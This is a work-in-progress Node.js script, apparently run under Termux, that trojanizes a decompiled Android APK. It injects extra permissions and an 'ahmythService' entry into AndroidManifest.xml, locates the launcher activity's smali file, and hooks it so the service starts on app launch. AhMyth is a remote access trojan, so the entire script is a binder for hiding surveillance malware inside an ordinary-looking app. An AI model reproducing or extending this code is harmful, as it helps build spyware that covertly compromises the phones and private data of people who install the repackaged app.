## New Bind on Launch function
> Work in progress.
```js
const fs = require('fs-extra');

const xml2js = require('xml2js');

const dir = require('path');

const readdirp = require('readdirp');

var CONSTANTS = require('/data/data/com.termux/files/home/test/Constants.js');

const apkFolder = '/data/data/com.termux/files/home/flappy';

var copyPermissions = (manifest) => { // $appCtrl.copyPermissions = (manifest) => {

    var firstPart = manifest.substring(0, manifest.indexOf("<application"));

    var lastPart = manifest.substring(manifest.indexOf("<application"));

    var permArray = CONSTANTS.permissions;

    for (var i = 0; i < permArray.length; i++) {

        var permissionName = permArray[i].substring(permArray[i].indexOf('name="') + 6);

        permissionName = permissionName.substring(0, permissionName.indexOf('"'));

        if (firstPart.indexOf(permissionName) == -1) {

            // Check if this is the first permission being added

            if (firstPart.indexOf('uses-permission') == -1) {

                firstPart = firstPart + "\n" + permArray[i];

            } else {

                // Add the permission above the first existing permission

                var index = firstPart.indexOf('<uses-permission');

                firstPart = firstPart.slice(0, index) + permArray[i] + "\n" + firstPart.slice(index);

            }

        }

    }

    return (firstPart + lastPart);

};

console.log('Reading the Android Manifest file...\n');

setTimeout(() => {

  fs.readFile(dir.join(apkFolder, 'AndroidManifest.xml'), 'utf8', (error, data) => {

    if (error) {

      console.log('Reading the Android Manifest file Failed!');

      return;

    }

    xml2js.parseString(data, (err, result) => {

      if (err) {

        console.error(err);

        return;

      }

      const launcherActivity = GetLauncherActivity(result, apkFolder);

      if (launcherActivity === -1) {

        console.log('Cannot Find a Suitable Class for Hooking in the Manifest!');

        console.log('Please use Another APK as a Template!.');

        return;

      }

      console.log('Modifying the Android Manifest File...\n');

      

      setTimeout(() => {

        const ahmythService = CONSTANTS.ahmythService;

        const permManifest = copyPermissions(data); //$appCtrl.copyPermissions(data);

        const newManifest = permManifest.substring(0, permManifest.indexOf('</application>')) + ahmythService

          + permManifest.substring(permManifest.indexOf('</application>'));

        fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), newManifest, 'utf8', (error) => {

          if (error) {

            console.log('Modifying the Android Manifest Failed!', error);

            return;      		          }

          

          console.log('Locating a Suitable Class File for Hooking...\n');

          

          setTimeout(() => {

            readdirp(apkFolder, {fileFilter: launcherActivity, alwaysStat: true})

              .on('data', (entry) => {

                var {path, stats: {}} = entry;

                var output = `${JSON.stringify(path)}`;

                if (process.platform === 'android') {

                  var launcherPath = output.replace(/^"(.*)"$/, '$1')

                    .replace(/\\/g, "/")

                    .replace(/\n$/, '');

                  if (!launcherPath) {

                    console.log('Unable to Locate the Hookable Smali Class File!');

                    return;

                  } else {

                    setTimeout(() => {

                      console.log('Scoped the Main Launcher Activity Class for Hooking: ' + launcherPath + '\n');

                    }, 1000);

                  }

        

                  console.log('Reading the Hookable Smali Class File...\n');

                  setTimeout(() => {

                    fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {

                      if (error) {

                        console.log('Unable to Read Hookable Class File!');

                        return;

                      }

                      

                      const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;

                      var hook = CONSTANTS.hookPoint;

                      console.log('Hooking the Main Smali Class File...');

                      var output = data.replace(hook, startService);

                      setTimeout(() => {

                        fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {

                          if (error) {

                            console.log('Modifying the Smali Class File Failed!', CONSTANTS.logStatus.FAIL);

                            return;

                          }

                        });

                      }, 1000);

                    });

                  }, 1000);

                };

              });

          }, 1000);

        });

      }, 1000);

    });

  });

}, 1000);

function GetLauncherActivity(manifest) {

  const application = manifest['manifest']['application'][0];

  

  let mainApplicationClassName = application && application['$'] && application['$']['android:name'];

  

  if (mainApplicationClassName && !mainApplicationClassName.startsWith('android.app')) {

    mainApplicationClassName = mainApplicationClassName.split('.').pop();

    

    if (mainApplicationClassName.startsWith('.')) {

      mainApplicationClassName = mainApplicationClassName.slice(1);

    }

    

    return mainApplicationClassName + '.smali';

  }

  

  const activity = application && application['activity'] && application['activity'].find((activity) => {

    const intentFilter = activity['intent-filter'];

    

    if (intentFilter) {

      return intentFilter.some((filter) =>

        filter['action'] &&

        filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&

        filter['category'] &&

        filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')

      );

    }

    

    return false;

  });

  

  if (activity) {

    let mainActivityClassName = activity['$'] && activity['$']['android:name'];

    mainActivityClassName = mainActivityClassName.split('.').pop();

    

    if (mainActivityClassName.startsWith('.')) {

      mainActivityClassName = mainActivityClassName.slice(1);

    }

    

    return mainActivityClassName + '.smali';

  }

  

  const activityAlias = application && application['activity-alias'] && application['activity-alias'].find((activityAlias) => {

    const intentFilter = activityAlias['intent-filter'];

    

    if (intentFilter) {

      return intentFilter.some((filter) =>

        filter['action'] &&

        filter['action'].some((action) => action['$']['android:name'] === 'android.intent.action.MAIN') &&

        filter['category'] &&

        filter['category'].some((category) => category['$']['android:name'] === 'android.intent.category.LAUNCHER' || category['$']['android:name'] === 'android.intent.category.DEFAULT')

      );

    }

    

    return false;

  });

  

  if (activityAlias) {

    let targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];

    targetActivityName = targetActivityName.split('.').pop();

    

    if (targetActivityName.startsWith('.')) {

      targetActivityName = targetActivityName.slice(1);

    }

    

    return targetActivityName + '.smali';

  }

  

  return -1;

}
```
